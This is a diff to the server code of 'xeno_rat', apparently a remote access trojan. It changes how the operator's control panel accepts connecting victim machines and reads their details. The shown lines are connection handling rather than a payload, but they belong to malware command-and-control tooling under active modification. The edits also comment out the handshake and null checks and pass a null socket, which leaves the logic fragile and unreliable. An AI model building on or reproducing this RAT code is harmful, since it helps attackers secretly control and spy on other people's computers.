@@ -118,30 +118,31 @@ namespace xeno_rat_server
             Commands["Debug Info"] = Debug_Info;
         }
 
-        private async Task OnConnect(Socket socket)
+        private async Task OnConnect(byte[] clientInfo)
         {
             int currentIdCount = currentCount++;
-            Node client = await Utils.ConnectAndSetupAsync(socket, key, currentIdCount, OnDisconnect);
-            if (client == null) 
-            {
-                try
-                {
-                    await Task.Factory.FromAsync(socket.BeginDisconnect, socket.EndDisconnect, true, null);
-                }
-                catch
-                {
-                    socket.Close(0);
-                    socket.Dispose();
-                }
-                return;
-            }
+            Node client = await Utils.ConnectAndSetupAsync(null, key, currentIdCount, OnDisconnect);
+            client.SockType = 0;
+            //if (client == null) 
+            //{
+            //    try
+            //    {
+            //        await Task.Factory.FromAsync(socket.BeginDisconnect, socket.EndDisconnect, true, null);
+            //    }
+            //    catch
+            //    {
+            //        socket.Close(0);
+            //        socket.Dispose();
+            //    }
+            //    return;
+            //}
             if (client.SockType == 0)
             {
                 ListViewItem clientdata = null;
                 try
                 {
                     clients[currentIdCount] = client;
-                    clientdata = await GetAddInfo(client);
+                    clientdata = await GetAddInfo(client, clientInfo);
                 }
                 catch 
                 {
@@ -324,23 +325,25 @@ namespace xeno_rat_server
             }
         }
         
-        private async Task<ListViewItem> GetAddInfo(Node type0node)
+        private async Task<ListViewItem> GetAddInfo(Node type0node, byte[] xxx)
         {
 
-            if (type0node.SockType != 0)
-            {
-                return null;
-            }
-            byte[] reqdataop = new byte[] { 1 };
-            if (!(await type0node.SendAsync(reqdataop)))
-            {
-                return null;
-            }
-            byte[] data = await type0node.ReceiveAsync();
-            if (data == null) 
-            {
-                return null;
-            }
+            //if (type0node.SockType != 0)
+            //{
+            //    return null;
+            //}
+            //byte[] reqdataop = new byte[] { 1 };
+            //if (!(await type0node.SendAsync(reqdataop)))
+            //{
+            //    return null;
+            //}
+            //byte[] data = await type0node.ReceiveAsync();
+            //if (data == null)
+            //{
+            //    return null;
+            //}
+            byte[] data = xxx;
+
             string[] strings = new string[ListviewItemCount];
             int start = 0;
             int end = 0;
